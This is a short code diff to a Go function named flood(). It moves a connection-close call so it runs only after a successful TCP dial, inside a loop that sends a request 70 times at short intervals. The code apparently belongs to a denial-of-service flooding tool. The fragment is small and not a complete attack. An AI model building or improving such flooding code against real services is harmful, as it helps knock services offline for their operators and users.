@@ -205,10 +205,10 @@ func flood() {
 		} else {
 			s, err = net.Dial("tcp", addr)
 		}
-		defer s.Close()
 		if err != nil {
 			fmt.Println("Connection Down!!!")
 		} else {
+			defer s.Close()
 			for i := 1; i <= 70; i++ {
 				s.Write([]byte(request))
 				time.Sleep(time.Millisecond * 100)
